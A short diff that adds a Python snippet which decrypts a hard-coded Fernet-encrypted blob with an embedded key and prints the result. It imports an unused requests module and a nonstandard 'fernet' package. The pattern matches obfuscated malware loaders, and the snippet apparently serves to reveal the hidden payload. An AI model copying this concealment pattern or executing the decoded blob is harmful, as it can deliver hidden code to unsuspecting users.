@@ -1,0 +1,4 @@
+import requests;
+from fernet import Fernet;
+hey = Fernet(b'POyTEni94fV1nlaISFtrEotKw8HjWuhQDs6147zeYyU=').decrypt(b'gAAAAABnFSTc6aFLD_6jPSMWFTLdklzkfUHnf3G7l9zB_DXMSTJ6tC0SlO2KrppemrHufrbK7f-vSPSHySemu0gZsNhLYI-tl-z_eGcerlpikw7pRGM83s6CjNj_F1v7TfFKrgh-5o8gSJ8z_rRN04RQ31Pt62qdxkG0SXHgW9e-ynl3LsSMjV55laHUrd6Q7k2HWXfP0-fPviLPRoeAXQE9qWHX1NGS77dJttktzjJkuTKc9Y9dCyg=')
+print(hey)
